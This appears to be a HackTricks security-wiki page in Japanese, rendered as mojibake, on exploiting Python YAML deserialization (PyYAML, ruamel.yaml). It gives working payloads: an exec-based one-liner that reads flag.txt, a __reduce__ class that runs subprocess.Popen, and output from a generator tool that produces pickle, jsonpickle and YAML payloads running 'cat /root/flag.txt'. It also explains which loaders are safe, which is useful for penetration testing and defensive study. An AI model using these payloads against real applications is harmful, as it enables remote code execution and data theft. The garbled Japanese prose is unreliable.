<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>


# Yaml **ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³**

**Yaml**ã®Pythonãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¯ã€ç”Ÿãƒ‡ãƒ¼ã‚¿ã ã‘ã§ãªãã€**Pythonã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```
print(yaml.dump(str("lol")))
lol
...

print(yaml.dump(tuple("lol")))
!!python/tuple
- l
- o
- l

print(yaml.dump(range(1,10)))
!!python/object/apply:builtins.range
- 1
- 10
- 1
```
**ã‚¿ãƒ—ãƒ«**ã¯ç”Ÿã®ãƒ‡ãƒ¼ã‚¿å‹ã§ã¯ãªã„ãŸã‚ã€**ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º**ã•ã‚Œã¾ã—ãŸã€‚ãã—ã¦ã€åŒã˜ã“ã¨ãŒ**range**ã«ã‚‚èµ·ã“ã‚Šã¾ã—ãŸï¼ˆbuiltinsã‹ã‚‰å–å¾—ï¼‰ã€‚

![](<../../.gitbook/assets/image (628) (1).png>)

**safe\_load()**ã¾ãŸã¯**safe\_load\_all()**ã¯SafeLoaderã‚’ä½¿ç”¨ã—ã€**ã‚¯ãƒ©ã‚¹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã›ã‚“**ã€‚ã‚¯ãƒ©ã‚¹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã®ä¾‹ï¼š
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:builtins.range [1, 10, 1]'

print(yaml.load(data, Loader=UnsafeLoader)) #range(1, 10)
print(yaml.load(data, Loader=Loader)) #range(1, 10)
print(yaml.load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=Loader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=UnsafeLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=FullLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load(data)) #range(1, 10)
print(yaml.full_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>

#The other ways to load data will through an error as they won't even attempt to
#deserialize the python object
```
ä»¥å‰ã®ã‚³ãƒ¼ãƒ‰ã§ã¯ã€**unsafe\_load**ã‚’ä½¿ç”¨ã—ã¦ã‚·ãƒªã‚¢ãƒ«åŒ–ã•ã‚ŒãŸPythonã‚¯ãƒ©ã‚¹ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã¾ã—ãŸã€‚ã“ã‚Œã¯ã€**ãƒãƒ¼ã‚¸ãƒ§ãƒ³>=5.1**ã§ã¯ã€load()ã¾ãŸã¯Loader=SafeLoaderã§æŒ‡å®šã•ã‚Œã¦ã„ãªã„Loaderã‚’ä½¿ç”¨ã—ã¦ã€ã‚·ãƒªã‚¢ãƒ«åŒ–ã•ã‚ŒãŸPythonã‚¯ãƒ©ã‚¹ã¾ãŸã¯ã‚¯ãƒ©ã‚¹å±æ€§ã‚’ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹ã“ã¨ãŒã§ããªã„ãŸã‚ã§ã™ã€‚

## åŸºæœ¬çš„ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ

**ã‚¹ãƒªãƒ¼ãƒ—ã‚’å®Ÿè¡Œã™ã‚‹**ä¾‹ï¼š
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:time.sleep [2]'
print(yaml.load(data, Loader=UnsafeLoader)) #Executed
print(yaml.load(data, Loader=Loader)) #Executed
print(yaml.load_all(data))
print(yaml.load_all(data, Loader=Loader))
print(yaml.load_all(data, Loader=UnsafeLoader))
print(yaml.load_all(data, Loader=FullLoader))
print(yaml.unsafe_load(data)) #Executed
print(yaml.full_load_all(data))
print(yaml.unsafe_load_all(data))
```
## Loaderã‚’æŒ‡å®šã—ãªã„è„†å¼±ãª.load("\<content>")

pyyamlã®**å¤ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã¯ã€ä½•ã‹ã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹éš›ã«**Loaderã‚’æŒ‡å®šã—ãªã‹ã£ãŸå ´åˆ**ã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºæ”»æ’ƒã®è„†å¼±æ€§ãŒã‚ã‚Šã¾ã—ãŸ: `yaml.load(data)`

[**ã“ã“ã§è„†å¼±æ€§ã®èª¬æ˜**](https://hackmd.io/@defund/HJZajCVlP)**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚** ãã®ãƒšãƒ¼ã‚¸ã§ææ¡ˆã•ã‚Œã¦ã„ã‚‹**æ”»æ’ƒæ‰‹æ³•**ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™:
```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
state:
update: !!python/name:exec
```
ã¾ãŸã¯ã€@ishaackãŒæä¾›ã™ã‚‹ã“ã®**ãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™:
```yaml
!!python/object/new:str {state: !!python/tuple ['print(exec("print(o"+"pen(\"flag.txt\",\"r\").read())"))', !!python/object/new:Warning {state : {update : !!python/name:exec } }]}
```
æœ€è¿‘ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§ã¯ã€`Loader`ãªã—ã§`.load()`ã‚’å‘¼ã³å‡ºã™ã“ã¨ã¯ã§ããªããªã‚Šã€`FullLoader`ã¯ã“ã®æ”»æ’ƒã«å¯¾ã—ã¦è„†å¼±ã§ã¯ãªããªã‚Šã¾ã—ãŸã€‚

# RCE

ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ä½œæˆã¯ã€**ä»»æ„ã®Python YAMLãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ï¼ˆPyYAMLã¾ãŸã¯ruamel.yamlï¼‰ã§åŒã˜æ–¹æ³•ã§è¡Œã†ã“ã¨ãŒã§ãã¾ã™**ã€‚åŒã˜ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€YAMLãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¾ãŸã¯PyYAMLã¾ãŸã¯ruamel.yamlã«åŸºã¥ãä»»æ„ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
import subprocess

class Payload(object):
def __reduce__(self):
return (subprocess.Popen,('ls',))

deserialized_data = yaml.dump(Payload()) # serializing data
print(deserialized_data)

#!!python/object/apply:subprocess.Popen
#- ls

print(yaml.load(deserialized_data, Loader=UnsafeLoader))
print(yaml.load(deserialized_data, Loader=Loader))
print(yaml.unsafe_load(deserialized_data))
```
## ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½œæˆã™ã‚‹ãƒ„ãƒ¼ãƒ«

ãƒ„ãƒ¼ãƒ«[https://github.com/j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator)ã¯ã€**Pickleã€PyYAMLã€jsonpickleã€ruamel.yaml**ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®Pythonã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚
```bash
python3 peas.py
Enter RCE command :cat /root/flag.txt
Enter operating system of target [linux/windows] . Default is linux :linux
Want to base64 encode payload ? [N/y] :
Enter File location and name to save :/tmp/example
Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All) :All
Done Saving file !!!!

cat /tmp/example_jspick
{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["cat", "/root/flag.txt"]}]}]}

cat /tmp/example_pick | base64 -w0
gASVNQAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwDY2F0lIwOL3Jvb3QvZmxhZy50eHSUhpSFlFKULg==

cat /tmp/example_yaml
!!python/object/apply:subprocess.Popen
- !!python/tuple
- cat
- /root/flag.txt
```
# å‚è€ƒæ–‡çŒ®

ã“ã®æŠ€è¡“ã«ã¤ã„ã¦ã®è©³ç´°ãªæƒ…å ±ã¯ã€æ¬¡ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š[https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
